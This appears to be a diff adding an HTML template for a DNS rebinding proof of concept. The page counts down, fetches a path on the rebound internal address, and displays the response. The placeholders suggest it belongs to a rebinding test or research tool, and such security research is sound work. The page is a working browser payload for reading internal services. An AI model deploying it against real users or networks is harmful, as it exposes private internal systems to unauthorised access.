@@ -1,0 +1,53 @@
+<html>
+<body>
+  <h1>DNS Rebinding PoC - Rebinding to {rebind_address}</h1>
+  <h2>Sending rebind request in <span id="counter">{rebind_timeout}</span> seconds</h2>
+  <pre>Preview of {rebind_scheme}://{rebind_address}:{rebind_port}/{rebind_path}:</pre>
+  <iframe src="{rebind_scheme}://{rebind_address}:{rebind_port}/{rebind_path}" width="100%"></iframe>
+  <div id="log"></div>
+  <script>
+var rebindTimer = {rebind_timeout};
+var rebindPath = "/{rebind_path}";
+
+function log(msg) {
+  var text = document.createTextNode(msg);
+  var pre = document.createElement("pre");
+  pre.setAttribute("style", "white-space: pre-wrap;");
+  pre.appendChild(text);
+  document.getElementById("log").appendChild(pre);
+}
+
+function countdown() {
+  var interval;
+  var counter = rebindTimer;
+
+  function step() {
+    counter -= 1;
+    document.getElementById("counter").innerHTML = counter;
+    if (counter == 0) {
+      clearInterval(interval)
+      run()
+    }
+  }
+  interval = setInterval(function(){ step() }, 1000);
+}
+
+async function run() {
+  try {
+    var resp = await fetch(rebindPath)
+      .then((response) => response.text())
+      .catch((error) => error);
+
+    log("Contents of {rebind_scheme}://{rebind_address}:{rebind_port}/{rebind_path}:");
+    log(resp);
+  }
+  catch(e) {
+    log("Retrying...");
+    countdown();
+  }
+}
+
+countdown();
+  </script>
+</body>
+</html>
